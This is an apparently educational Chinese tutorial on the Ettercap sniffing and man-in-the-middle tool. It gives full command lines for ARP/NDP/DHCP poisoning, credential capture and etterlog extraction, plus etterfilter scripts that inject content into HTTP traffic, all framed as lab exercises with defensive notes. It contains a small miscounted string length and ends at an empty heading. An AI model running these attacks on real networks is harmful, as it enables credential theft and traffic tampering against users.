# Ettercap（交换网络嗅探与 MITM）

> **一句话**：在交换局域网中做中间人攻击（ARP/ICMP/DHCP/端口/IPv6 投毒）、嗅探明文凭据、并对流量做实时过滤与篡改。
> **分类**：嗅探与欺骗 ｜ **Kali 包**：`ettercap`（含 `ettercap-common`、`ettercap-graphical`、`ettercap-text-only`、`etterfilter`、`etterlog`）｜ **官方文档**：<https://ettercap.github.io/ettercap/>

## 1. 它解决什么问题

**交换网络（Switched LAN）的根本问题**：交换机**只把帧发给目的端口**，所以你的网卡**看不到别人之间的流量**。

Ettercap 解决的正是这个问题：

| 你想要的 | Ettercap 怎么做 |
| --- | --- |
| 看到同网段其他主机的流量 | **ARP 投毒**把自己放到中间 |
| 在跨网段的场景做 MITM | **ICMP 重定向 / DHCP 投毒 / 端口镜像** |
| 从流量里提取明文凭据 | 内置大量协议的**凭据解析器** |
| 实时修改流量内容 | **etterfilter 内容过滤器** + **Lua 脚本** |
| 事后分析一次捕获 | **etterlog** 分析日志文件 |
| 做 IPv6 MITM | **NDP 投毒** |

**与 [bettercap](../05-无线攻击/bettercap.md) 的对比**：

| | Ettercap | bettercap |
| --- | --- | --- |
| 诞生 | 2001 年，经典工具 | 2016 年后，现代 Go 实现 |
| 界面 | GUI（GTK）/ curses / 纯文本 | 交互式控制台 + Web UI |
| 脚本 | **etterfilter 内容过滤器**（独有）+ Lua | JavaScript 模块 + caplet |
| 自动化 | 一般 | ⭐ **REST API + WebSocket** |
| 协议解析 | ⭐ **凭据解析器极多且成熟** | 好，但不如 ettercap 广 |
| 目标选择 | ⭐ **TARGET1/TARGET2 语法很灵活** | IP/CIDR |

**Ettercap 仍然值得学的原因**：

1. **凭据解析器极其丰富**——内置几十种协议的密码提取（含大量老协议）；
2. **etterfilter** 提供了一套**声明式的内容篡改语言**，写起来比写 JS 模块简单得多；
3. **TARGET 语法**在复杂场景下表达力很强；
4. **etterlog** 能对日志做精细回溯分析。

**实务建议**：**做 MITM 用 bettercap（更现代、更易自动化）；做「凭据提取 + 内容篡改」用 ettercap（解析器更全、过滤器更简单）**。

## 2. 工作原理

### 2.1 为什么交换网络需要「投毒」

回顾一下交换网络的行为：

```
[主机 A] ──── [交换机] ──── [主机 B]
                 │
            [你（攻击者）]

A 发给 B 的帧，交换机只转发给 B 的端口 → 你收不到
A 发的广播帧，交换机会泛洪到所有端口 → 你能收到
```

**攻击思路**：让 A 和 B 都以为**对方的 MAC 是你**，这样流量就会经过你。

### 2.2 ARP 投毒（最主要的 MITM 方式）

**ARP 协议没有认证**——任何设备都可以回答「谁的 IP 是 X」。

```
正常：
  A 广播 "谁是 192.168.1.1？"  → 网关回复 "我是，MAC 是 GW_MAC"
  A 缓存：192.168.1.1 → GW_MAC

投毒后（攻击者 MAC = ATK_MAC）：
  攻击者 → A：  "192.168.1.1 的 MAC 是 ATK_MAC"
  攻击者 → 网关："192.168.1.100（A）的 MAC 是 ATK_MAC"
  
  A 缓存：192.168.1.1 → ATK_MAC        ← 指向攻击者
  网关缓存：192.168.1.100 → ATK_MAC      ← 指向攻击者

结果：
  A → 攻击者 → 网关 → 互联网
  A ← 攻击者 ← 网关 ← 互联网
                ↑
    攻击者在中间（可以读、改、丢）
```

**⚠️ 关键点**：**ARP 投毒是双向的**。只毒一侧会导致**单向流量**（A 能收到回复，但发不出去）。Ettercap 默认做双向投毒。

**Ettercap 的 ARP 投毒方法**（`-M arp` 的参数）：

| 方法 | 含义 |
| --- | --- |
| `arp:remote` | **默认**。双向投毒目标之间（**最常用**） |
| `arp:oneway` | 单向投毒（只毒一个方向） |
| `arp:` （无参数） | 需要你手工指定 targets |

### 2.3 其他 MITM 方式

| `-M` 方法 | 原理 | 适用 |
| --- | --- | --- |
| `arp` | ARP 投毒 | ⭐ **同一广播域内，最常用** |
| `icmp` | ICMP 重定向 | 跨网段（路由器会发 ICMP 重定向告知更优路径） |
| `dhcp` | DHCP 投毒（伪装成 DHCP 服务器） | 影响面大，能控制网关/DNS 分配 |
| `port` | 端口窃取（Port Stealing） | 特殊场景，比 ARP 隐蔽 |
| `ndp` | IPv6 邻居发现投毒 | ⭐ **IPv6 环境下的等价物** |

**优先级建议**：

```text
同一广播域 → arp
IPv6 环境  → ndp
跨网段     → icmp（需要路由器配合）或 dhcp
特殊场景   → port
```

### 2.4 TARGET 语法（Ettercap 的独特设计）

Ettercap 用**两个 target** 来定义「谁和谁之间的流量」：

```text
ettercap -M arp:remote /TARGET1/ /TARGET2/
                                   ↑      ↑
                            左侧/源        右侧/目的
```

**TARGET 的完整语法**：

```
/MAC/ /IPv4/ /IPv6/ /PORT/
```

各部分都可以省略，省略表示「任意」。写法示例：

| TARGET | 含义 |
| --- | --- |
| `//` | 任意（**谨慎使用**——可能是整个网段） |
| `/192.168.1.100/` | 指定 IP |
| `/192.168.1.0-40/` | IP 范围 |
| `/192.168.1.0/24/` | 网段（CIDR） |
| `//-192.168.1.1/` | **任何主机到网关**（`-` 前缀表示「排除该地址」） |
| `/192.168.1.100/80` | 指定 IP 和端口 |
| `/aa:bb:cc:dd:ee:ff/` | 按 MAC |
| `//443` | 任意主机的 443 端口 |

**⭐ 最常用的两个写法**：

```bash
# ① 毒「主机 → 网关」这一对（最常用，影响面最小）
ettercap -T -M arp:remote /192.168.1.100/ /192.168.1.1/

# ② 毒「整个网段」（⚠️ 影响面大，仅限自己完全掌控的实验网络）
ettercap -T -M arp:remote // //
```

**`-R, --reversed`**：反转 TARGET 匹配逻辑，用「不匹配」的目标。

### 2.5 凭据解析（Ettercap 的核心价值）

Ettercap 内置**几十种协议的凭据解析器**。当流量经过时，它会自动尝试提取：

| 类别 | 协议 |
| --- | --- |
| 文件传输 | FTP、TFTP、SMB |
| 邮件 | POP3、IMAP4、SMTP |
| 远程登录 | Telnet、RLOGIN、SSH1 |
| Web | **HTTP Basic/Digest**、HTTP 表单（部分） |
| 数据库 | MySQL、MSSQL、PostgreSQL |
| 目录服务 | LDAP |
| 其他 | SNMP、RADIUS、VNC、X11、NNTP、IRC、SMB |

**它的原理**：**协议级解析**——不是简单的关键字匹配，而是理解协议的报文结构（如 FTP 的 `USER` / `PASS` 命令，HTTP Basic 的 `Authorization` 头）。

**⚠️ 关键限制**：

| 限制 | 说明 |
| --- | --- |
| **只能解析明文协议** | HTTPS/TLS 加密后看不到内容 |
| **需要流量经过你** | 必须完成 MITM |
| **部分协议需要端口识别** | 非标准端口的协议可能认不出 |

**Ettercap 的输出**（找到凭据时）：

```
HTTP : 192.168.1.100:54321 -> 93.184.216.34:80 | USER: admin  PASS: secret123
FTP  : 192.168.1.100:54322 -> 10.0.0.5:21     | USER: ftpuser PASS: ftppass
```

**⭐ 这两行就是「抓到凭据」的标志**——`USER:` 和 `PASS:` 字段。

### 2.6 SSL MITM（`--certificate` / `--private-key`）

Ettercap 可以拦截 HTTPS（通过在中间充当 TLS 端点）：

```bash
ettercap -T -M arp:remote \
  --certificate /path/to/server.pem \
  --private-key /path/to/server.key \
  /192.168.1.100/ /192.168.1.1/
```

**它做了什么**：

```
客户端 ←→ [Ettercap（伪造证书）] ←→ 真实服务器
              ↑
       你要让客户端信任这张证书
```

**⚠️ 关键前提**：**客户端必须信任你的 CA**。否则会看到证书警告。

**这意味着两件事**：

1. **攻击成功 = 客户端的信任配置已被影响**（这是「证书固定」存在的理由）；
2. **`-S, --nosslmitm`** 选项可以**关闭** SSL MITM（如果你只想要明文协议）。

**现代环境下的现实**：

| 防护措施 | 对 SSL MITM 的效果 |
| --- | --- |
| **证书固定（certificate pinning）** | ✅ 完全阻断（App 内置固定证书） |
| **HSTS** | ✅ 阻断（浏览器拒绝降级） |
| **HSTS preload** | ✅ 阻断（首次访问就强制 HTTPS） |
| **用户检查证书警告** | ✅ 阻断（但如果用户习惯点「继续」就失效） |
| **CT 日志监控** | 能**发现**可疑证书 |

### 2.7 内容过滤（etterfilter）—— Ettercap 的独门功能

**etterfilter** 是一个编译器：**把类 C 的过滤脚本编译成 `.ef` 字节码**，然后由 ettercap 在运行时执行。

**一个简单的 etterfilter 脚本**：

```c
// replace.c —— 替换 HTTP 响应里的字符串
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");   // 让服务器返回未压缩内容
        msg("zapped Accept-Encoding!\n");
    }
}
if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<title>Example")) {
        replace("<title>Example", "<title>HACKED!");
        msg("title replaced!\n");
    }
}
```

**编译并使用**：

```bash
# 编译
etterfilter replace.c -o replace.ef

# 使用
ettercap -T -M arp:remote -F replace.ef /192.168.1.100/ /192.168.1.1/
```

**etterfilter 的核心函数**：

| 函数 | 作用 |
| --- | --- |
| `search(buffer, string)` | 在缓冲区里查找字符串 |
| `replace(string, string)` | 替换（**要求新旧字符串等长！**） |
| `regex(buffer, "regex", replacement)` | 用正则替换 |
| `msg(string)` | 打印消息 |
| `log(buffer)` | 把缓冲区写入日志 |
| `drop()` | **丢弃这个包** |
| `inject(buffer)` | 注入数据 |
| `exit()` | 退出 ettercap |
| `exec(command)` | 执行命令 |

**⭐ `replace()` 的等长要求是一个重要的限制**：`replace("Accept-Encoding", "Accept-Rubbish!")` —— 两个字符串都是 15 字符，所以长度一样。

**要替换成不同长度的内容**，需要用 `regex()` 或 `inject()`。

**etterfilter 的典型用途**：

| 用途 | 说明 |
| --- | --- |
| **禁用压缩** | 替换 `Accept-Encoding`，让服务器返回明文（便于分析） |
| **篡改内容** | 替换网页里的字符串（演示用） |
| **注入 JavaScript** | 在 HTTP 响应里插入 `<script>`（**这是 XSS 攻击的 MITM 变体**） |
| **丢弃特定包** | 用 `drop()` 造成定向干扰 |
| **提取特定内容** | 用 `search()` + `log()` |

**⚠️ 内容篡改是「主动修改他人数据」**——法律性质比单纯嗅探更严重。**只在自有/授权环境中使用。**

### 2.8 etterlog —— 事后分析

Ettercap 的 `-L` 会写一个日志文件（不是 pcap，而是 ettercap 自有格式）。**etterlog** 能对这个日志做精细分析。

| 功能 | 参数 |
| --- | --- |
| 分析日志 | `-a` |
| 列出所有连接 | `-c` |
| **打印所有账号信息** | `-p` |
| 按用户搜索 | `-u <user>` |
| 按客户端 IP 搜索 | `-I <ip>` |
| 按目标过滤 | `-f <TARGET>` |
| 按协议过滤 | `-t <proto>` |
| 按正则搜索 | `-e <regex>` |
| 十六进制显示 | `-X` |
| HTML 输出 | `-H` |
| 从连接中提取文件 | `-D` |
| 合并多个日志 | `-C` + `-o` |

**最常用的命令**：

```bash
# 打印日志里所有抓到的账号密码
etterlog -p /path/to/ettercap.log

# 列出所有连接
etterlog -c /path/to/ettercap.log

# 搜索某个 IP 相关的流量
etterlog -f /192.168.1.100/ /path/to/ettercap.log

# 从日志里提取传输的文件
etterlog -D /path/to/ettercap.log
```

**⭐ `etterlog -p` 是「从日志里捞出所有凭据」的一键命令。**

## 3. 安装与快速上手

```bash
sudo apt install ettercap-text-only    # 命令行版（推荐，无图形依赖）
# 或
sudo apt install ettercap-graphical     # 带 GTK GUI
```

**注意包的拆分**：

| 包 | 提供 |
| --- | --- |
| `ettercap-common` | 共享库与插件 |
| `ettercap-text-only` | 纯文本界面（`-T`） |
| `ettercap-graphical` | GTK 界面（`-G`）+ `ettercap-pkexec` 启动器 |
| 单独的 `etterfilter` / `etterlog` 二进制 | 随上述包装 |

**检查接口**：

```bash
sudo ettercap -I
```

**最短工作流**：

```bash
# 1) 找出网关和目标
ip route | grep default
# default via 192.168.1.1 dev eth0

ip neigh            # 或 arp -a，看有哪些邻居

# 2) 只抓包不投毒（先确认能看到什么）
sudo ettercap -T -i eth0

# 3) ARP 投毒 + 嗅探（⚠️ 仅限自有/授权网络）
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/
```

**`-T` 是纯文本界面**（推荐用于脚本和远程）。在文本界面里：

| 按键 | 作用 |
| --- | --- |
| `h` | 帮助 |
| `l` | 列出所有主机（**重要**） |
| `c` | 列出连接 |
| `p` | 列出插件 |
| `o` | 显示当前 MITM 状态 |
| `s` | 显示统计 |
| `q` | 退出 |

## 4. 核心参数详解

### 4.1 嗅探与攻击选项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-M, --mitm <METHOD:ARGS>` | **执行 MITM 攻击** | ⭐ 最核心。`-M arp:remote` 最常用 |
| `-o, --only-mitm` | 只做 MITM，不嗅探 | 只想转发/篡改时用 |
| `-b, --broadcast` | 也嗅探广播包 | 默认不嗅探广播（减少噪声） |
| `-B, --bridge <IFACE>` | 桥接嗅探（需要两个接口） | 内联 MITM 场景 |
| `-p, --nopromisc` | **不把接口设为混杂模式** | 减少被检测的可能；只看到发给自己的包 |
| `-S, --nosslmitm` | **不做 SSL MITM** | ⭐ 只关心明文协议时用（避免证书问题） |
| `-u, --unoffensive` | 不转发包 | ⚠️ **会让目标断网**（做一次性的干扰测试） |
| `-r, --read <file>` | 从 pcap 文件读取 | 离线分析 |
| `-f, --pcapfilter <string>` | 设置 BPF 过滤器 | 与 [tcpdump](tcpdump.md) 语法相同 |
| `-R, --reversed` | 反转 TARGET 匹配 | 想匹配「除某些目标外」时用 |
| `-t, --proto <proto>` | 只嗅探指定协议 | 减少输出噪声 |
| `--certificate <file>` | SSL MITM 用的证书 | PEM 格式 |
| `--private-key <file>` | SSL MITM 用的私钥 | PEM 格式 |
| `--lua-script <s1,s2,...>` | 加载 Lua 脚本 | 比 etterfilter 更强大 |
| `--lua-args n1=v1,n2=v2` | 传给 Lua 脚本的参数 | — |

### 4.2 用户界面

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-T, --text` | **纯文本界面** | ⭐ 推荐（无图形依赖） |
| `-q, --quiet` | 不显示包内容 | 只看凭据时用 |
| `-s, --script <CMD>` | 向界面发送命令 | 自动化 |
| `-C, --curses` | curses 界面 | 老式 GUI |
| `-D, --daemon` | 守护进程模式（无界面） | ⭐ 后台运行 |
| `-G, --gtk` | GTK GUI | 需要图形环境 |

**`-D`（daemon）与 `-T -q` 的区别**：

| | `-T -q` | `-D` |
| --- | --- | --- |
| 输出 | 只打印凭据等关键信息 | 完全无输出 |
| 适合 | 想实时看到结果 | 纯后台运行（只写日志） |

### 4.3 日志选项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-w, --write <file>` | **写 pcap 文件** | 配 [Wireshark](wireshark.md) 分析 |
| `-L, --log <logfile>` | **写 ettercap 日志**（所有流量） | 配 `etterlog` 分析 |
| `-l, --log-info <logfile>` | 只记录被动信息 | 体积小 |
| `-m, --log-msg <logfile>` | 只记录消息（含凭据） | ⭐ 只想看关键信息时 |
| `-c, --compress` | 压缩日志 | — |

**⭐ `-L` + `etterlog -p` 是最实用的组合**：

```bash
ettercap -T -q -i eth0 -L /tmp/ettercap.log -M arp:remote /192.168.1.100/ /192.168.1.1/
# 跑一段时间后退出

etterlog -p /tmp/ettercap.log     # 打印所有抓到的凭据
```

### 4.4 可视化选项

| 参数 | 作用 |
| --- | --- |
| `-d, --dns` | 把 IP 解析成主机名 |
| `-V, --visual <format>` | 可视化格式（如 `hex`、`ascii`、`ebcdic`） |
| `-e, --regex <regex>` | **只显示匹配正则的包** |
| `-E, --ext-headers` | 打印扩展头 |
| `-Q, --superquiet` | **不显示用户名和密码** |（做演示时不泄露凭据） |

### 4.5 通用选项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-i, --iface <iface>` | 网络接口 | ⭐ 显式指定 |
| `-I, --liface` | 列出所有接口 | — |
| `-Y, --secondary <ifaces>` | 次要接口列表 | 多接口场景 |
| `-n, --netmask <netmask>` | 强制指定掩码 | — |
| `-A, --address <address>` | 强制指定本机地址 | — |
| `-P, --plugin <plugin>` | 加载插件（可多次） | — |
| `--plugin-list <p1,p2>` | 逗号分隔的插件列表 | — |
| `-F, --filter <file>` | **加载 etterfilter 编译后的 `.ef` 文件** | ⭐ 内容篡改 |
| `-z, --silent` | 不做初始 ARP 扫描 | 减少噪声/麻烦 |
| `-6, --ip6scan` | 发 ICMPv6 探测发现 IPv6 节点 | IPv6 场景 |
| `-j, --load-hosts <file>` | 从文件加载主机列表 | — |
| `-k, --save-hosts <file>` | 保存主机列表到文件 | — |
| `-W, --wifi-key <wkey>` | 解密 WPA/WEP 无线包 | 离线解密无线抓包 |
| `-a, --config <config>` | 使用指定配置文件 | — |
| `-v, --version` | 版本 | — |
| `-h, --help` | 帮助 | — |

### 4.6 `-M` 的各种 MITM 方法

| 方法 | 完整写法 | 说明 |
| --- | --- | --- |
| **ARP 远程** | `-M arp:remote /T1/ /T2/` | ⭐ **默认，最常用**。双向投毒 |
| ARP 单向 | `-M arp:oneway` | 只毒一个方向 |
| ICMP | `-M icmp:remote` | ICMP 重定向（跨网段） |
| DHCP | `-M dhcp:/ip_pool/netmask` | 伪 DHCP 服务器（**影响面大**） |
| 端口窃取 | `-M port:remote` | Port Stealing |
| IPv6 NDP | `-M ndp:remote` | IPv6 邻居发现投毒 |

**⚠️ `-M dhcp` 的影响面**：它会**影响整个广播域**（所有请求 DHCP 的设备）。**绝不在生产网络中使用。**

## 5. 实战演练

**环境声明（非常重要）**：ARP 投毒会**劫持网段内的流量**——这属于**主动中间人攻击**，对任何非自有、非授权网络执行**都是违法的**。

以下所有操作**必须在完全隔离的实验环境中进行**：

```
✅ 推荐环境：host-only 虚拟网络
   [Kali 攻击机] ─┐
                  ├── host-only 虚拟网络 192.168.56.0/24
   [靶机 A] ──────┤   （没有桥接到物理网卡！）
   [靶机 B] ──────┘

✅ 或者：你自己完全掌控的一个物理隔离 VLAN
❌ 绝不：公司网络、家庭网络（有别人设备）、公共网络
```

**如何确认是隔离的**：

```bash
# 确认网卡没有桥接到物理网络
ip addr show eth0
# 应该是 VirtualBox Host-Only 或仅主机模式的网段（如 192.168.56.x）

# 确认看不到任何未知设备
sudo ettercap -T -i eth0
# 按 l 列出主机 —— 应该只有你自己 + 你的靶机
```

**⭐ 如果 `l` 列出的主机里有你不认识的设备——立即停止。**

### 场景 1：只嗅探不投毒（先确认能看到什么）

**先做这一步**——它不发起任何攻击，只是看看网络里有什么。

```bash
sudo ettercap -T -i eth0
```

**预期输出**

```
ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team

Listening for unified sniffing...

Text Only Interface activated...
Hit 'h' for inline help

```

**按 `l` 列出主机**：

```
  0) 192.168.56.20   08:00:27:AA:BB:CC       ← 你自己
  1) 192.168.56.1    0A:00:27:00:00:00   (gateway)
  2) 192.168.56.10   08:00:27:12:34:56       ← 你的靶机
```

**⭐ 记下目标 IP 和网关 IP** —— 下一步要用。

**注意**：**没有 `-M` 参数时，ettercap 只是被动嗅探**，它只能看到自己的流量 + 广播。这不会影响你的网络。

**按 `q` 退出**。

### 场景 2：ARP 投毒 + 凭据嗅探（核心流程）

**⚠️ 前提**：目标 `192.168.56.10` 是你**自己的靶机**。

**步骤 1：准备靶机上的明文服务**

在你的靶机上启动一个会传输明文凭据的服务（例如 [DVWA](../04-口令攻击/README.md) 或一个 FTP 服务器）：

```bash
# 在靶机上（示例）
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

**步骤 2：启动 ettercap 做 ARP 投毒**

```bash
sudo ettercap -T -q -i eth0 \
  -L /tmp/ettercap-demo.log \
  -M arp:remote \
  /192.168.56.10/ /192.168.56.1/
```

**逐参数解释**：

| 参数 | 作用 |
| --- | --- |
| `-T` | 纯文本界面 |
| `-q` | 安静（不打印包内容，只打印关键信息） |
| `-i eth0` | 接口 |
| `-L /tmp/ettercap-demo.log` | ⭐ **写 ettercap 日志**（供 `etterlog` 分析） |
| `-M arp:remote` | **双向 ARP 投毒** |
| `/192.168.56.10/` | TARGET1 = 靶机 |
| `/192.168.56.1/` | TARGET2 = 网关 |

**⭐ 这个 TARGET 组合的含义**：**投毒「靶机 ↔ 网关」这条链路**。所有靶机访问外网的流量都会经过你。

**预期输出**

```
ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team

Listening for unified sniffing...

Text Only Interface activated...
Hit 'h' for inline help

```

**按 `o` 查看 MITM 状态**：

```
 +-------------------------------------+
 |  MITM ARP: REMOTE                   |       ← ✅ 投毒已启用
 +-------------------------------------+
```

然后启动：**你的提示符会变成 `o`** —— 表示 MITM 已激活。

**步骤 3：在靶机上产生流量**

在靶机的浏览器里访问 DVWA 并登录（用错误的凭据演示即可，或你自己设的凭据）：

```
http://192.168.56.10/dvwa/login.php
用户名：admin
密码：password
```

**⚠️ 这个连接是从靶机出发的——但目标是它自己（192.168.56.10）**。

**ARN 说明**：要演示 MITM 抓取**外网**凭据，靶机应该访问**外部服务**。或者更简单的做法：让靶机访问 `http://192.168.56.1/`（网关上的 Web 服务）。

**更好的实验设计**：

```
[靶机] 访问 http://192.168.56.1/login（网关上的一个测试 HTTP 服务）
        ↓ 流量经过 [你的 Kali]
[Ettercap 抓到 HTTP Basic 凭据]
```

**步骤 4：观察 ettercap 的输出**

当靶机发出明文凭据时，ettercap 会打印：

```
HTTP : 192.168.56.10:54321 -> 192.168.56.1:80 | USER: admin  PASS: secret123
```

**⭐ `USER:` 和 `PASS:` 就是抓到的凭据。**

**其他协议的输出格式**：

```
FTP  : 192.168.56.10:54322 -> 192.168.56.1:21 | USER: ftpuser PASS: ftppass
POP3 : 192.168.56.10:54323 -> 192.168.56.1:110 | USER: user@example.com PASS: pass
TELNET: ...
LDAP : ...
```

**步骤 5：退出并恢复**

按 `q` 退出。

**⚠️ 关键**：**ettercap 退出时会自动停止 ARP 投毒并恢复目标的 ARP 表**。

**验证恢复**（在靶机上）：

```bash
# Windows
arp -a | findstr 192.168.56.1
# Linux
arp -n 192.168.56.1
```

**应该显示网关的真实 MAC**（`0a:00:27:00:00:00`），而不是你的 MAC。**如果还是你的 MAC，说明恢复失败了** —— 见第 8 节的排错。

**步骤 6：用 etterlog 分析日志**

```bash
# 打印所有抓到的凭据
etterlog -p /tmp/ettercap-demo.log
```

**预期输出**

```
HTTP : 192.168.56.10:54321 -> 192.168.56.1:80 | USER: admin  PASS: secret123
```

```bash
# 列出所有连接
etterlog -c /tmp/ettercap-demo.log | head -20

# 搜索特定 IP 的流量
etterlog -f /192.168.56.10/ /tmp/ettercap-demo.log | head -30
```

**⭐ `etterlog -p` 是「从日志一键提取凭据」的标准做法。**

### 场景 3：用 pcap 输出给 Wireshark 深度分析

Ettercap 的日志格式只有 `etterlog` 能读，但你可以**同时输出 pcap**：

```bash
sudo ettercap -T -q -i eth0 \
  -w /tmp/ettercap-capture.pcap \
  -M arp:remote \
  /192.168.56.10/ /192.168.56.1/
```

**跑一段时间后退出**：

```bash
# 用 Wireshark 分析
wireshark /tmp/ettercap-capture.pcap

# 或用 tshark 快速提取
tshark -r /tmp/ettercap-capture.pcap -Y "http.request" \
  -T fields -e ip.src -e http.host -e http.request.uri

# 找明文凭据
tshark -r /tmp/ettercap-capture.pcap \
  -Y 'http.authorization || ftp || telnet'
```

**⭐ 这是最佳组合**：**ettercap 负责 MITM 与凭据解析，Wireshark 负责深度分析**。

**同时输出两种格式**：

```bash
sudo ettercap -T -q -i eth0 \
  -L /tmp/ettercap.log \
  -w /tmp/ettercap-capture.pcap \
  -M arp:remote \
  /192.168.56.10/ /192.168.56.1/
```

- `-L` 的日志用 `etterlog` 分析（**凭据提取更专业**）；
- `-w` 的 pcap 用 [Wireshark](wireshark.md) 分析（**协议细节更完整**）。

### 场景 4：内容篡改（etterfilter）

**⚠️ 这是「主动修改数据」——只在完全属于你的实验环境用。**

**步骤 1：写一个 etterfilter 脚本**

```bash
cat > /tmp/inject.c <<'EOF'
// inject.c —— 在 HTTP 响应里注入一条提示（演示用）
// 仅在完全隔离的实验环境中使用

if (ip.proto == TCP && tcp.dst == 80) {
    // 删除 Accept-Encoding，让服务器返回未压缩内容（便于替换）
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("[*] zapped Accept-Encoding\n");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    // 在 </body> 前注入一段文本
    if (search(DATA.data, "</body>")) {
        replace("</body>", "<div>MODIFIED</div></body>");
        msg("[*] response modified\n");
    }
}
EOF
```

**⚠️ 注意 `replace()` 的等长限制**：

```
"</body>"        → 7 字符
"<div>MODIFIED</div></body>"  → 长度不同！
```

**这个脚本会因为长度不等而失败**。正确写法：

```c
// 等长替换（长度必须完全一样）
if (search(DATA.data, "<title>Demo")) {
    replace("<title>Demo", "<title>HACK");     // 都是 12 字符 ✅
}
```

**要替换成不同长度的内容，用 `regex()` 或 `inject()`**：

```c
// 用 inject 注入（不要求等长）
if (ip.proto == TCP && tcp.src == 80 && search(DATA.data, "</body>")) {
    inject("INJECTED");
}
```

**步骤 2：编译**

```bash
etterfilter /tmp/inject.c -o /tmp/inject.ef
```

**预期输出**

```
etterfilter 0.8.4.1 copyright 2001-2026 Ettercap Development Team

12 protocol tables loaded:
	DECnet (dn)  ...
...

Content filters loaded from /tmp/inject.c...

if (ip.proto == TCP && tcp.dst == 80) {
...
}
```

**编译失败时会报行号和原因**：

```
/tmp/inject.c:12: error: syntax error near "}"
```

**步骤 3：使用过滤器**

```bash
sudo ettercap -T -q -i eth0 \
  -F /tmp/inject.ef \
  -M arp:remote \
  /192.168.56.10/ /192.168.56.1/
```

**步骤 4：在靶机上观察效果**

访问 HTTP 页面，看内容是否被修改。ettercap 的终端会打印：

```
[*] zapped Accept-Encoding
[*] response modified
```

**⭐ 这个练习的教学价值**：

| 学到的 | 说明 |
| --- | --- |
| **MITM 可以修改内容** | 不只是「看」，而是「改」 |
| **为什么需要 SRI（子资源完整性）** | 页面里的 JS/CSS 可以被篡改 → 注入恶意代码 |
| **为什么需要 HSTS + 证书固定** | HTTPS 让内容篡改失效 |
| **`replace` 的等长限制** | 真实攻击中需要用更复杂的手法（如 inject） |

**⭐ 重要提示**：`etterfilter` 的 `replace` 有一个著名用法——**替换 HTTPS 页面里的链接来绕过 HSTS**（这属于规避安全机制）。**在授权测试中必须明确允许才能做**，且**不应以规避检测为目的**。

### 场景 5：IPv6 的 NDP 投毒

**现代网络大量使用 IPv6**，而 IPv6 的邻居发现协议（NDP）**和 ARP 一样没有认证**。

```bash
# 先发现 IPv6 节点
sudo ettercap -T -i eth0 -6

# NDP 投毒
sudo ettercap -T -q -i eth0 \
  -M ndp:remote \
  /fe80::1/ /fe80::abcd/
```

**⚠️ IPv6 的一个现实**：**多数组织对自己的 IPv6 流量几乎没有监控**。这意味着：

> 如果目标是双栈的，**攻击者可能发现「IPv6 这条路上没有防御设备」**。
>
> **这是蓝队必须检查的一件事**：确认 IPv6 的监控与 IPv4 一致，不需要 IPv6 就关掉。

### 场景 6：离线分析（`-r` 读 pcap）

**如果你只有抓包文件，没有网络访问权限**：

```bash
# 从 pcap 读取并做凭据解析（不需要 MITM！）
sudo ettercap -T -q -r /tmp/capture.pcap
```

**⭐ 这是一条被低估的实用路径**：

| 优势 | 说明 |
| --- | --- |
| **不需要在网络上做 MITM** | 完全离线，零风险 |
| **不需要网络访问权限** | 只要有 pcap 文件 |
| **凭据解析器同样有效** | 内置协议解析器照常工作 |

**完整流程**：

```bash
# 1) 用 tcpdump 抓（在有权限的位置，如你自己的服务器）
sudo tcpdump -i eth0 -w /tmp/server.pcap -s 0 -c 100000

# 2) 用 ettercap 离线解析（不做任何 MITM）
sudo ettercap -T -q -r /tmp/server.pcap -L /tmp/parsed.log

# 3) 提取凭据
etterlog -p /tmp/parsed.log
```

**⭐ 这是「分析已有抓包」的最佳工具组合**：`ettercap -r` 的协议解析器比手动 grep 有效得多。

## 6. 输出解读

### 启动输出

```
ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team

Listening for unified sniffing...

Text Only Interface activated...
Hit 'h' for inline help
```

| 行 | 含义 |
| --- | --- |
| `Listening for unified sniffing` | ✅ 已开始嗅探 |
| `Text Only Interface activated` | ✅ 文本界面已启动 |
| 如果**卡在这里** | 可能在等接口/权限；检查 `-i` 和 `sudo` |
| `ERROR: Interface eth0 is not up` | 接口没起来 |
| `ERROR: You must be root` | 需要 root 或相应 capability |

### MITM 状态（按 `o`）

```
 +-------------------------------------+
 |  MITM ARP: REMOTE                   |
 +-------------------------------------+
```

| 状态 | 含义 |
| --- | --- |
| `MITM ARP: REMOTE` | ✅ ARP 双向投毒已启用 |
| `MITM NDP: REMOTE` | ✅ IPv6 NDP 投毒 |
| 没有这一块 | ❌ MITM 没启动（检查 `-M` 参数） |

**提示符的变化**：MITM 激活后，ettercap 的提示符会从 `>` 变成 `o`。

### 凭据输出（**最重要的输出**）

```
HTTP : 192.168.56.10:54321 -> 192.168.56.1:80 | USER: admin  PASS: secret123
FTP  : 192.168.56.10:54322 -> 192.168.56.1:21 | USER: ftpuser PASS: ftppass
```

| 部分 | 含义 |
| --- | --- |
| `HTTP` / `FTP` / `POP3` / ... | 协议名 |
| `192.168.56.10:54321` | **客户端** IP:端口（凭据的来源） |
| `->` | 方向 |
| `192.168.56.1:80` | **服务器** IP:端口 |
| `USER:` | 用户名 |
| **`PASS:`** | ⭐ **口令（明文）** |

**⭐ 这就是最终结果**——`USER:` 和 `PASS:` 都出现才算完整的凭据。

**如果只看到 `USER:` 没有 `PASS:`**：

| 原因 | 说明 |
| --- | --- |
| 密码阶段在握手后（如 SMB NTLM） | 只看到用户名（NTLM 是挑战-响应，不是明文口令） |
| 只抓到了请求没抓到响应 | 抓包时间窗不够 |

### 主机的表示

Ettercap 用 `-` 表示主机（等价于「全部」）。在主机列表里看到：

```
  1) 192.168.56.1    0A:00:27:00:00:00   (gateway)
```

**`(gateway)` 标记**说明 ettercap 自动识别了网关。

### 判断成功 / 常见问题

